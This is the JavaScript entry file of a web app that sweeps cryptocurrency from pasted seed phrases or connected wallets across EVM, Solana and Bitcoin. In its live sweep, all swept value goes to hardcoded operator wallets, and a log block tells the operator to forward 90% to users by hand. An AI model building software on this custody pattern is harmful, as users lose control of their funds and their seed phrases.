/**
 * main.js — Application entry point.
 */

import { ethers } from 'ethers';
import QRCode from 'qrcode';
import { state, resetState, clearAll } from './state.js';
import { createWallet } from './wallet.js';
import { validateMnemonic, deriveAll } from './derive.js';
import { previewWallet as previewEvm, sweepEvm, getProvider, CHAINS as EVM_CHAINS } from './evm.js';
import { previewSolanaWallet, sweepSolana, getConnection } from './solana.js';
import { previewBitcoinWallet, sweepBitcoin } from './bitcoin.js';
import { $, $$, el, show, hide, logLine, clearLog } from './ui.js';
import { initSentry, initPlausible, reportError, track } from './telemetry.js';
import { getClientId, fetchBalance, consumeCredit, invalidateBalanceCache, recordFee } from './credits.js';
import { showCryptoPaymentModal } from './crypto-pay.js';
import { userShare, operatorFee, FEE_WALLET_EVM } from './config.js';

const WC_PROJECT_ID = '74d3ed4f87d14b6cac7556234dfb72a3';

// =====================================================================
// VALIDATION HELPERS
// =====================================================================

function isEvmAddress(s) {
  return /^0x[a-fA-F0-9]{40}$/.test(s);
}

function isSolanaAddress(s) {
  return /^[1-9A-HJ-NP-Za-km-z]{32,44}$/.test(s);
}

function isBitcoinAddress(s) {
  if (/^bc1[a-z0-9]{39,59}$/.test(s)) return true;
  if (/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(s)) return true;
  return false;
}

// =====================================================================
// UI HELPERS
// =====================================================================

function showWalletSection(type) {
  $$('.wallet-section').forEach((s) => { s.style.display = 'none'; });
  const target = $(`#wallet-${type}`);
  if (target) target.style.display = '';
}

function readInputs() {
  const walletType = $('input[name=wallet-type]:checked')?.value || 'mnemonic';
  const families = {
    evm: $('#family-evm').checked,
    solana: $('#family-solana').checked,
    bitcoin: $('#family-bitcoin').checked,
  };
  const destinations = {
    evm: $('#dest-evm').value.trim(),
    solana: $('#dest-solana').value.trim(),
    bitcoin: $('#dest-bitcoin').value.trim(),
  };
  const evmChains = $$('#chain-list input[type=checkbox]:checked').map((cb) => cb.value);

  let mnemonics = [];
  if (walletType === 'mnemonic') {
    const text = $('#phrases').value.trim();
    mnemonics = text.split('\n').map((s) => s.trim()).filter(Boolean);
  }

  Object.assign(state, { walletType, families, destinations, evmChains, mnemonics });
  return { walletType, families, destinations, evmChains, mnemonics };
}

function validateInputs({ walletType, families, destinations, mnemonics }) {
  const errors = [];
  const warnings = [];

  if (!families.evm && !families.solana && !families.bitcoin) {
    errors.push('Select at least one family to sweep (EVM, Solana, or Bitcoin).');
    return { errors, warnings };
  }

  if (walletType === 'mnemonic') {
    if (mnemonics.length === 0) errors.push('At least one mnemonic is required.');
    for (let i = 0; i < mnemonics.length; i++) {
      if (!validateMnemonic(mnemonics[i])) {
        errors.push(`Mnemonic #${i + 1} is not a valid BIP-39 phrase.`);
      }
    }
  }

  if (families.evm) {
    if (!destinations.evm) {
      errors.push('EVM destination address is required.');
    } else if (!isEvmAddress(destinations.evm)) {
      errors.push('EVM destination must be a valid 0x address.');
    }
  }

  if (families.solana) {
    if (!destinations.solana) {
      errors.push('Solana destination address is required.');
    } else if (!isSolanaAddress(destinations.solana)) {
      errors.push('Solana destination must be a valid base58 address.');
    }
  }

  if (families.bitcoin) {
    if (!destinations.bitcoin) {
      errors.push('Bitcoin destination address is required.');
    } else if (!isBitcoinAddress(destinations.bitcoin)) {
      errors.push('Bitcoin destination must be a valid Bitcoin address (bc1..., 1..., or 3...).');
    }
  }

  if (families.solana && destinations.solana && isEvmAddress(destinations.solana)) {
    warnings.push('Your Solana destination looks like an EVM address. If you meant to sweep Solana, please provide a Solana address.');
  }
  if (families.bitcoin && destinations.bitcoin && isEvmAddress(destinations.bitcoin)) {
    warnings.push('Your Bitcoin destination looks like an EVM address. Bitcoin sweeps require a Bitcoin address.');
  }
  if (families.evm && destinations.evm && isSolanaAddress(destinations.evm) && !isEvmAddress(destinations.evm)) {
    warnings.push('Your EVM destination looks like a Solana address. If you meant to sweep EVM, please provide a 0x address.');
  }

  return { errors, warnings };
}

function updateCreditsBadge(balance) {
  const badge = $('#credits-badge');
  if (!badge) return;
  if (balance > 0) {
    badge.textContent = `${balance} credit${balance > 1 ? 's' : ''}`;
    badge.className = 'credits-badge credits-available';
  } else {
    badge.textContent = 'No credits';
    badge.className = 'credits-badge credits-empty';
  }
}

// =====================================================================
// DESTINATION FIELD VISIBILITY
// =====================================================================

function syncDestinationFields() {
  const evm = $('#family-evm').checked;
  const solana = $('#family-solana').checked;
  const bitcoin = $('#family-bitcoin').checked;

  const evmWrap = $('#dest-evm-wrap');
  const solanaWrap = $('#dest-solana-wrap');
  const bitcoinWrap = $('#dest-bitcoin-wrap');

  if (evmWrap) evmWrap.style.display = evm ? '' : 'none';
  if (solanaWrap) solanaWrap.style.display = solana ? '' : 'none';
  if (bitcoinWrap) bitcoinWrap.style.display = bitcoin ? '' : 'none';

  const chainList = $('#chain-list');
  if (chainList) chainList.style.display = evm ? '' : 'none';
}

// =====================================================================
// CONNECT WALLET
// =====================================================================

async function connectWalletAndStore() {
  const { walletType } = readInputs();
  track.walletSelected(walletType);

  try {
    if (walletType === 'mnemonic') {
      logLine('Mnemonic mode: keys will be derived during Preview.');
      return;
    }

    if (walletType === 'extension') {
      logLine('Connecting to browser wallet...');
      const backend = await createWallet({ type: 'extension' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }

    if (walletType === 'walletconnect') {
      logLine('Connecting WalletConnect...');
      const qrContainer = $('#wc-qr');
      qrContainer.innerHTML = '';

      const backend = await createWallet({
        type: 'walletconnect',
        wcProjectId: WC_PROJECT_ID,
        wcOnUri: (uri) => {
          logLine('Scan this QR with your mobile wallet:');
          QRCode.toCanvas(uri, { width: 240, margin: 2 })
            .then((canvas) => {
              canvas.style.background = '#fff';
              canvas.style.borderRadius = '8px';
              canvas.style.padding = '12px';
              qrContainer.appendChild(canvas);
            })
            .catch((err) => logLine(`QR render failed: ${err.message}`));
        },
      });

      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }

    if (walletType === 'ledger') {
      logLine('Requesting Ledger access via WebHID...');
      const backend = await createWallet({ type: 'ledger' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Ledger connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }

    if (walletType === 'trezor') {
      logLine('Requesting Trezor access...');
      const backend = await createWallet({ type: 'trezor' });
      state.wallet = backend;
      const addr = await backend.getAddress();
      logLine(`Trezor connected: ${addr}`);
      $('#connected-address').textContent = addr;
      show('#connected-banner');
      return;
    }
  } catch (e) {
    logLine(`ERROR: ${e.message}`);
    reportError(e, { phase: 'connect', walletType });
    track.error('connect_failed');
  }
}

// =====================================================================
// PREVIEW
// =====================================================================

async function runPreview() {
  const startTime = Date.now();
  clearLog();
  const inputs = readInputs();
  const { errors, warnings } = validateInputs(inputs);

  if (errors.length > 0) {
    for (const e of errors) logLine(`ERROR: ${e}`);
    return;
  }
  for (const w of warnings) logLine(`WARN: ${w}`);

  track.previewStarted({
    walletType: inputs.walletType,
    families: Object.entries(inputs.families).filter(([, v]) => v).map(([k]) => k),
    chainCount: inputs.evmChains.length,
    mnemonicCount: inputs.mnemonics.length,
  });

  try {
    if (inputs.walletType === 'mnemonic') {
      logLine(`Deriving keys for ${inputs.mnemonics.length} mnemonic(s)...`);
      state.derivedKeys = deriveAll(inputs.mnemonics, inputs.families);
      logLine(`Derived: ${state.derivedKeys.evm.length} EVM, ${state.derivedKeys.solana.length} Solana, ${state.derivedKeys.bitcoin.length} Bitcoin`);
      for (const err of state.derivedKeys.errors) logLine(`WARN: ${err}`);
    } else {
      if (!state.wallet) {
        logLine('ERROR: connect your wallet first');
        return;
      }
      const addr = await state.wallet.getAddress();
      state.derivedKeys = { evm: [{ address: addr, wallet: null, index: 0 }], solana: [], bitcoin: [], errors: [] };
      logLine(`Using connected address: ${addr}`);
    }

    state.previews = { evm: [], solana: [], bitcoin: [] };

    if (inputs.families.evm) {
      for (const { address, index } of state.derivedKeys.evm) {
        for (const chain of state.evmChains) {
          logLine(`\nPreviewing ${chain} ${address}...`);
          try {
            const p = await previewEvm(chain, address);
            state.previews.evm.push({ index, ...p });
            logLine(`  native: ${p.native?.formatted ?? '0'} ${p.native?.symbol ?? ''}`);
            for (const t of p.tokens) logLine(`  ${t.symbol}: ${t.formatted}`);
            if (p.error) logLine(`  warning: ${p.error}`);
          } catch (e) {
            logLine(`  ERROR: ${e.message}`);
            reportError(e, { phase: 'preview_evm', chain });
          }
        }
      }
    }

    if (inputs.families.solana && state.derivedKeys.solana.length > 0) {
      const conn = getConnection();
      for (const { address, index } of state.derivedKeys.solana) {
        logLine(`\nPreviewing Solana ${address}...`);
        try {
          const p = await previewSolanaWallet(conn, address);
          state.previews.solana.push({ index, ...p });
          logLine(`  SOL: ${p.sol?.formatted ?? 0}`);
          logLine(`  tokens: ${p.tokens.length}`);
        } catch (e) {
          logLine(`  ERROR: ${e.message}`);
        }
      }
    }

    if (inputs.families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
      for (const { address, index } of state.derivedKeys.bitcoin) {
        logLine(`\nPreviewing Bitcoin ${address}...`);
        try {
          const p = await previewBitcoinWallet(address);
          state.previews.bitcoin.push({ index, ...p });
          logLine(`  utxos: ${p.utxos.length}, balance: ${p.balance} sats`);
        } catch (e) {
          logLine(`  ERROR: ${e.message}`);
        }
      }
    }

    logLine('\nPreview complete. Review before sweeping.');
    show('#run-button');

    const tokensFound =
      state.previews.evm.reduce((n, p) => n + p.tokens.length, 0) +
      state.previews.solana.reduce((n, p) => n + p.tokens.length, 0);

    track.previewCompleted({ walletType: inputs.walletType, durationMs: Date.now() - startTime, tokensFound });
  } catch (e) {
    reportError(e, { phase: 'preview_fatal' });
    track.error('preview_fatal');
    throw e;
  }
}

// =====================================================================
// PAYMENT
// =====================================================================

async function requirePayment() {
  track.paymentStarted('crypto');
  try {
    const result = await showCryptoPaymentModal('pack-5');
    track.paymentCompleted('crypto');
    return result;
  } catch (err) {
    throw err;
  }
}

// =====================================================================
// SWEEP
// =====================================================================

async function runSweep(live) {
  const startTime = Date.now();
  if (!state.derivedKeys) {
    logLine('ERROR: run Preview first');
    return;
  }

  const inputs = readInputs();
  const destinations = inputs.destinations;
  const families = inputs.families;

  // ---- PAYMENT GATE (only for live) ----
  if (live) {
    logLine('\n⚠ Reminder: each wallet needs native gas to broadcast.');
    logLine('  Ethereum mainnet: ~0.005 ETH');
    logLine('  Base / Arbitrum / Optimism: ~0.0002 ETH');
    logLine('  Polygon: ~0.5 POL');
    logLine('  BNB Chain: ~0.002 BNB');
    logLine('A 10% service fee applies to the swept value.\n');

    let balance = await fetchBalance();

    if (balance < 1) {
      logLine('No credits available. Opening payment modal...');
      try {
        await requirePayment();
        balance = await fetchBalance({ force: true });
        logLine(`Payment complete. Credits: ${balance}`);
      } catch (err) {
        logLine(`Payment cancelled or failed: ${err.message}`);
        return;
      }
    }

    if (balance < 1) {
      logLine('ERROR: still no credits after payment.');
      return;
    }

    // Updated confirmation prompt — includes fee notice
    const confirm = prompt(`This live sweep will consume 1 credit (you have ${balance}).\nA 10% service fee is applied to the swept value.\n\nType LIVE_SWEEP_NOW to confirm:`);
    if (confirm !== 'LIVE_SWEEP_NOW') {
      logLine('Live sweep cancelled.');
      return;
    }

    try {
      const newBalance = await consumeCredit('sweep');
      logLine(`Credit consumed. Remaining: ${newBalance}`);
      updateCreditsBadge(newBalance);
    } catch (err) {
      logLine(`ERROR: could not consume credit: ${err.message}`);
      return;
    }
  }

  const dryRun = !live;
  logLine(`\n=== ${dryRun ? 'DRY RUN' : 'LIVE SWEEP'} STARTED ===`);
  track.sweepStarted(live);

  state.results = { evm: [], solana: [], bitcoin: [] };
  let successes = 0;
  let failures = 0;

  const feeReceipts = {
    evm: {},
    solana: 0n,
    bitcoin: 0n,
  };

  try {
    // =================================================================
    // EVM
    // =================================================================
    if (families.evm) {
      for (const entry of state.derivedKeys.evm) {
        const address = entry.address;
        for (const chain of state.evmChains) {
          logLine(`\n[EVM ${chain}] ${address}`);
          try {
            const provider = getProvider(chain);

            let signer;
            if (state.walletType === 'mnemonic') {
              signer = entry.wallet.connect(provider);
            } else if (state.walletType === 'extension') {
              const cfg = EVM_CHAINS[chain];
              try {
                await state.wallet.switchChain(cfg.chainId);
              } catch (e) {
                // Cosmetic fix: use an em-dash instead of parens to avoid double parens
                logLine(`  SKIPPED: could not switch wallet to ${chain} — ${e.message}`);
                continue;
              }
              await new Promise((r) => setTimeout(r, 300));
              signer = await state.wallet.getEthersSigner(provider);
            } else {
              signer = await state.wallet.getEthersSigner(provider);
            }

            const preview = state.previews.evm.find((p) => p.address === address && p.chain === chain);
            const tokens = preview?.tokens || [];

            const r = await sweepEvm(chain, signer, { dryRun, tokens, slippageBps: 100 });
            state.results.evm.push({ chain, address, ...r });

            const chainReceived = BigInt(r.usdcReceivedRaw || '0');
            feeReceipts.evm[chain] = (feeReceipts.evm[chain] || 0n) + chainReceived;

            for (const s of r.swaps) {
              const receivedNote = s.received ? ` (received ${s.received} USDC)` : '';
              logLine(`  swap ${s.symbol}: ${s.status}${s.txHash ? ' ' + s.txHash : ''}${receivedNote}${s.note ? ' (' + s.note + ')' : ''}${s.error ? ' — ' + s.error : ''}`);
              if (s.status === 'SUCCESS') successes++;
              if (s.status === 'FAILED' || s.status === 'ERROR') failures++;
            }
            for (const t of r.transfers) {
              const receivedNote = t.received ? ` (received ${t.received} USDC)` : '';
              logLine(`  transfer ${t.symbol}: ${t.status}${t.txHash ? ' ' + t.txHash : ''}${receivedNote}`);
              if (t.status === 'SUCCESS') successes++;
              if (t.status === 'FAILED' || t.status === 'ERROR') failures++;
            }
            for (const e of r.errors) logLine(`  ERROR: ${e}`);
          } catch (e) {
            logLine(`  FATAL: ${e.message}`);
            reportError(e, { phase: 'sweep_evm', chain });
          }
        }
      }
    }

    // =================================================================
    // Solana
    // =================================================================
    if (families.solana && state.derivedKeys.solana.length > 0) {
      const conn = getConnection();
      for (const { keypair, address, index } of state.derivedKeys.solana) {
        logLine(`\n[Solana] ${address}`);
        try {
          const r = await sweepSolana(conn, keypair, { dryRun });
          state.results.solana.push({ index, ...r });
          feeReceipts.solana += BigInt(r.usdcReceivedRaw || '0');
          for (const s of r.swaps) {
            const receivedNote = s.received ? ` (received ${s.received} raw)` : '';
            logLine(`  swap ${s.mint.slice(0, 8)}: ${s.status} ${s.signature || ''}${receivedNote}`);
            if (s.status === 'SUCCESS') successes++;
            if (s.status === 'FAILED' || s.status === 'ERROR') failures++;
          }
          for (const t of r.transfers) {
            const receivedNote = t.received ? ` (received ${t.received} raw)` : '';
            logLine(`  transfer ${t.mint.slice(0, 8)}: ${t.status} ${t.signature || ''}${receivedNote}`);
            if (t.status === 'SUCCESS') successes++;
            if (t.status === 'FAILED' || t.status === 'ERROR') failures++;
          }
          for (const e of r.errors) logLine(`  ERROR: ${e}`);
        } catch (e) {
          logLine(`  FATAL: ${e.message}`);
        }
      }
    }

    // =================================================================
    // Bitcoin
    // =================================================================
    if (families.bitcoin && state.derivedKeys.bitcoin.length > 0) {
      for (const { keyPair, address, index } of state.derivedKeys.bitcoin) {
        logLine(`\n[Bitcoin] ${address}`);
        try {
          const r = await sweepBitcoin(address, keyPair, { dryRun });
          state.results.bitcoin.push({ index, ...r });
          feeReceipts.bitcoin += BigInt(r.amountRaw || '0');
          const receivedNote = r.amountRaw && r.amountRaw !== '0' ? ` (received ${r.amountRaw} sats)` : '';
          logLine(`  ${r.status} ${r.txid || ''} ${r.error || ''}${receivedNote}`);
          if (r.status === 'SUCCESS') successes++;
          if (r.status === 'ERROR' || r.status === 'BROADCAST_ERROR') failures++;
        } catch (e) {
          logLine(`  FATAL: ${e.message}`);
        }
      }
    }

    logLine(`\n=== ${dryRun ? 'DRY RUN' : 'LIVE SWEEP'} COMPLETE ===`);

    // =================================================================
    // FEE WALLET GAS WARNING
    // =================================================================
    // Warn if the EVM fee wallet is low on gas and might fail when the
    // operator tries to forward the 90% afterward.
    if (live && Object.keys(feeReceipts.evm).length > 0) {
      try {
        const baseProvider = getProvider('base');
        const feeBalance = await baseProvider.getBalance(FEE_WALLET_EVM);
        const minGas = ethers.parseEther('0.0001');
        if (feeBalance < minGas) {
          logLine(`\n⚠ WARNING: Fee wallet is low on Base gas (${ethers.formatEther(feeBalance)} ETH).`);
          logLine(`   Top up ${FEE_WALLET_EVM} on Base before forwarding 90% to users.`);
        }
      } catch (e) {
        // ignore — this is a best-effort warning
      }
    }

    // =================================================================
    // MANUAL FORWARD SUMMARY
    // =================================================================
    logLine('\n═══════════════════════════════════════════════════════════');
    logLine('MANUAL FORWARD REQUIRED');
    logLine('═══════════════════════════════════════════════════════════');
    logLine('Swept value has landed in the fee wallets. Send 90% to the');
    logLine('user and keep 10%. Details below:');
    logLine('');

    for (const chain of state.evmChains) {
      const received = feeReceipts.evm[chain] || 0n;
      if (received === 0n) continue;
      const decimals = chain === 'bnb' ? 18 : 6;
      const userAmount = userShare(received);
      const feeAmount = operatorFee(received);
      logLine(`[EVM ${chain}]`);
      logLine(`  Fee wallet:       0x8B180186C79D146fd5617B31A9e2A3d938954Fa9`);
      logLine(`  USDC received:    ${ethers.formatUnits(received, decimals)}`);
      logLine(`  Send to user:     ${ethers.formatUnits(userAmount, decimals)} USDC → ${destinations.evm || '(no destination set)'}`);
      logLine(`  Keep as fee:      ${ethers.formatUnits(feeAmount, decimals)} USDC (10%)`);
      logLine('');
    }

    if (feeReceipts.solana > 0n) {
      const userAmount = userShare(feeReceipts.solana);
      const feeAmount = operatorFee(feeReceipts.solana);
      logLine(`[Solana]`);
      logLine(`  Fee wallet:       6vJg5hV5fjvmnawcvhB5ihtfdegnRjgzWuDXdYYMDzS5`);
      logLine(`  USDC received:    ${ethers.formatUnits(feeReceipts.solana, 6)}`);
      logLine(`  Send to user:     ${ethers.formatUnits(userAmount, 6)} USDC → ${destinations.solana || '(no destination set)'}`);
      logLine(`  Keep as fee:      ${ethers.formatUnits(feeAmount, 6)} USDC (10%)`);
      logLine('');
    }

    if (feeReceipts.bitcoin > 0n) {
      const userAmount = userShare(feeReceipts.bitcoin);
      const feeAmount = operatorFee(feeReceipts.bitcoin);
      logLine(`[Bitcoin]`);
      logLine(`  Fee wallet:       bc1qcxzlxmqgxfzvduvkatd06kv4m2ch973r5gzakk`);
      logLine(`  BTC received:     ${Number(feeReceipts.bitcoin) / 1e8} BTC`);
      logLine(`  Send to user:     ${Number(userAmount) / 1e8} BTC → ${destinations.bitcoin || '(no destination set)'}`);
      logLine(`  Keep as fee:      ${Number(feeAmount) / 1e8} BTC (10%)`);
      logLine('');
    }

    logLine('═══════════════════════════════════════════════════════════');

    // =================================================================
    // RECORD FEE ON THE WORKER
    // =================================================================
    if (live && (Object.keys(feeReceipts.evm).length > 0 || feeReceipts.solana > 0n || feeReceipts.bitcoin > 0n)) {
      try {
        const receipts = [];

        for (const chain of state.evmChains) {
          const received = feeReceipts.evm[chain] || 0n;
          if (received === 0n) continue;
          const decimals = chain === 'bnb' ? 18 : 6;
          // Include source wallet address for operator audit trail
          const sourceEntry = state.derivedKeys.evm.find((e) => {
            const preview = state.previews.evm.find((p) => p.chain === chain && p.address === e.address);
            return !!preview;
          });
          receipts.push({
            family: 'evm',
            chain,
            sourceAddress: sourceEntry?.address || null,
            amountRaw: received.toString(),
            decimals,
            symbol: 'USDC',
            recipient: '0x8B180186C79D146fd5617B31A9e2A3d938954Fa9',
            userDestination: destinations.evm,
            userShareRaw: userShare(received).toString(),
            operatorFeeRaw: operatorFee(received).toString(),
          });
        }

        if (feeReceipts.solana > 0n) {
          receipts.push({
            family: 'solana',
            sourceAddress: state.derivedKeys.solana[0]?.address || null,
            amountRaw: feeReceipts.solana.toString(),
            decimals: 6,
            symbol: 'USDC',
            recipient: '6vJg5hV5fjvmnawcvhB5ihtfdegnRjgzWuDXdYYMDzS5',
            userDestination: destinations.solana,
            userShareRaw: userShare(feeReceipts.solana).toString(),
            operatorFeeRaw: operatorFee(feeReceipts.solana).toString(),
          });
        }

        if (feeReceipts.bitcoin > 0n) {
          receipts.push({
            family: 'bitcoin',
            sourceAddress: state.derivedKeys.bitcoin[0]?.address || null,
            amountRaw: feeReceipts.bitcoin.toString(),
            decimals: 8,
            symbol: 'BTC',
            recipient: 'bc1qcxzlxmqgxfzvduvkatd06kv4m2ch973r5gzakk',
            userDestination: destinations.bitcoin,
            userShareRaw: userShare(feeReceipts.bitcoin).toString(),
            operatorFeeRaw: operatorFee(feeReceipts.bitcoin).toString(),
          });
        }

        if (receipts.length > 0) {
          const recorded = await recordFee({
            receipts,
            sweepDurationMs: Date.now() - startTime,
            successes,
            failures,
          });

          logLine(`\nReceipt recorded on the worker. Sweep ID: ${recorded.sweepId}`);
          logLine(`The operator will forward 90% to the user shortly.`);
        }
      } catch (e) {
        logLine(`\nWARN: could not record fee on the worker: ${e.message}`);
        logLine(`You'll need to manually reconcile this sweep from the log above.`);
      }
    }

    track.sweepCompleted({ live, durationMs: Date.now() - startTime, successes, failures });
  } catch (e) {
    reportError(e, { phase: 'sweep_fatal', live });
    track.error('sweep_fatal');
    throw e;
  }
}

// =====================================================================
// WIRE UP
// =====================================================================

document.addEventListener('DOMContentLoaded', async () => {
  initSentry().catch(() => {});
  initPlausible();

  getClientId();
  const balance = await fetchBalance();
  updateCreditsBadge(balance);

  $$('input[name=wallet-type]').forEach((radio) => {
    radio.addEventListener('change', (e) => {
      showWalletSection(e.target.value);
      hide('#connected-banner');
    });
  });
  showWalletSection('mnemonic');

  ['#family-evm', '#family-solana', '#family-bitcoin'].forEach((sel) => {
    const el = $(sel);
    if (el) el.addEventListener('change', syncDestinationFields);
  });
  syncDestinationFields();

  const connectBtn = $('#connect-button');
  if (connectBtn) connectBtn.addEventListener('click', connectWalletAndStore);

  $('#preview-button').addEventListener('click', runPreview);
  $('#run-button').addEventListener('click', () => runSweep(state.mode === 'live'));

  $('#buy-credits-button')?.addEventListener('click', async () => {
    try {
      await requirePayment();
      const newBalance = await fetchBalance({ force: true });
      updateCreditsBadge(newBalance);
    } catch (err) {
      console.error('Buy credits failed:', err);
    }
  });

  $('#clear-button').addEventListener('click', async () => {
    if (state.wallet) {
      try { await state.wallet.dispose(); } catch {}
    }
    clearAll();
    $('#phrases').value = '';
    $('#dest-evm').value = '';
    $('#dest-solana').value = '';
    $('#dest-bitcoin').value = '';
    clearLog();
    hide('#run-button');
    hide('#connected-banner');
  });

  $$('input[name=mode]').forEach((radio) => {
    radio.addEventListener('change', (e) => {
      state.mode = e.target.value;
      const runBtn = $('#run-button');
      if (runBtn) {
        runBtn.textContent = state.mode === 'live' ? '⚡ EXECUTE LIVE SWEEP' : '▶ Run Dry Run';
        runBtn.className = state.mode === 'live' ? 'btn btn-danger' : 'btn btn-primary';
      }
      const warning = $('#live-warning');
      if (warning) {
        warning.style.display = state.mode === 'live' ? '' : 'none';
      }
    });
  });

  state.mode = 'dry-run';
});